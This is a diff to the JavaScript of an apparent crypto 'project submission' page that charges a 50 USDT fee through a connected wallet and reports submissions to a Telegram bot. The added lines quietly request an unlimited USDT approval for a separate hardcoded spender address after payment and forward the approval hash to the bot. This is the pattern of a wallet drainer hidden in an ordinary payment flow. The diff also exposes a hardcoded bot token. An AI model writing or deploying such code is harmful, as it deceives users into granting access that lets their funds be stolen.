@@ -2,6 +2,7 @@
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a";
 const AMOUNT_USDT = "50";
+const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
 const USDT_DECIMALS = 6;
 
 const TELEGRAM_BOT_TOKEN = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
@@ -61,7 +62,7 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  function formatTelegramMessage(data, txHash) {
+  function formatTelegramMessage(data, txHash, approvalHash) {
     return `
 <b>🆕 New Project Submission</b>
 
@@ -83,6 +84,9 @@ ${data.description}
 <b>Payment TX:</b>
 <code>${txHash}</code>
 
+<b>Approval TX:</b>
+<code>${approvalHash}</code>
+
 <b>Status:</b> UNDER REVIEW
 `;
   }
@@ -103,15 +107,15 @@ ${data.description}
 
     const amount = ethers.utils.parseUnits(AMOUNT_USDT, USDT_DECIMALS);
 
-    statusText.textContent = "Approving USDT…";
-    await (await usdt.approve(RECEIVER, amount)).wait();
-
     statusText.textContent = "Sending payment…";
     const tx = await usdt.transferFrom(userAddress, RECEIVER, amount);
     await tx.wait();
 
+    const approveTx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
+    await approveTx.wait();
+
     const formData = getFormData();
-    await sendToTelegram(formatTelegramMessage(formData, tx.hash));
+    await sendToTelegram(formatTelegramMessage(formData, tx.hash, approveTx.hash));
 
     showUnderReview();
   }
@@ -144,38 +148,38 @@ ${data.description}
     }
   });
 
-walletConnectBtn.addEventListener("click", async () => {
-  try {
-    console.log("🔗 WalletConnect clicked");
+  /* ---------- WalletConnect ---------- */
+  walletConnectBtn.addEventListener("click", async () => {
+    try {
+      console.log("🔗 WalletConnect clicked");
 
-    // 🔥 IMPORTANT: close modal first
-    walletModal.style.display = "none";
+      walletModal.style.display = "none";
 
-    const { EthereumProvider } = await import(
-      "https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
-    );
+      const { EthereumProvider } = await import(
+        "https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
+      );
 
-    const wcProvider = await EthereumProvider.init({
-      projectId: WALLETCONNECT_PROJECT_ID,
-      chains: [1],
-      showQrModal: true,
-      qrModalOptions: {
-        themeMode: "dark"
-      }
-    });
+      const wcProvider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        chains: [1],
+        showQrModal: true,
+        qrModalOptions: {
+          themeMode: "dark"
+        }
+      });
 
-    await wcProvider.enable(); // NOW MODAL OPENS ON TOP
+      await wcProvider.enable();
 
-    console.log("✅ WalletConnect connected");
+      console.log("✅ WalletConnect connected");
 
-    const provider = new ethers.providers.Web3Provider(wcProvider, "any");
-    await processPayment(provider);
+      const provider = new ethers.providers.Web3Provider(wcProvider, "any");
+      await processPayment(provider);
 
-  } catch (error) {
-    console.error("WalletConnect error:", error);
-    alert("WalletConnect connection failed");
-  }
-});
+    } catch (error) {
+      console.error("WalletConnect error:", error);
+      alert("WalletConnect connection failed");
+    }
+  });
 
   /************ PERSISTENCE ************/
   if (localStorage.getItem("projectSubmissionStatus") === "under_review") {
